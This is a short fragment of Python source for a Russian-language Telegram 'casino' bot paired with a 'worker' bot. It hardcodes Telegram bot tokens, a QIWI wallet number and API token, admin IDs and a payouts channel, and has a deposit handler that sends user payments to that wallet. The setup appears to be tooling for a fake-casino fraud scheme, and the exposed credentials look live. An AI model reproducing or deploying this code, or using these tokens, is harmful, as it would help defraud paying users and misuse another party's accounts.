...
tickets = '1670591810:AAEXyawvlEZ02ZuARClHD6u8ECaD7NNSZ-0' # TOKEN Бота воркера
bot = telebot.TeleBot('1674593246:AAFiB17r1HTmXSerIKMaCPIClubNst_-cg0') # TOKEN Бота казино

admin = 701223439 # ID Админа
support_id = 701223439 # ID Саппорта
channel_id = -1001247898658 # ID Канала с вылатами
support = 'fonbetsup_support' # Username Сапорта

phone = '79644628322' # Номер киви без +
token = '1a4ed0adc0eca20cb6186385126a1ae8' # API TOKEN QIWI
...
def deposit(message):
	try:
		if (str(message.chat.id) in in_deposit):
			...
			inline_2 = types.InlineKeyboardButton(text = "Перейти на оплату(Киви\Карта)", url = f'https://qiwi.com/payment/form/99?currency=RUB&amountInteger={str(message.text)}&amountFraction=0&extra[%27account%27]={phone}&extra[%27comment%27]={bill}')
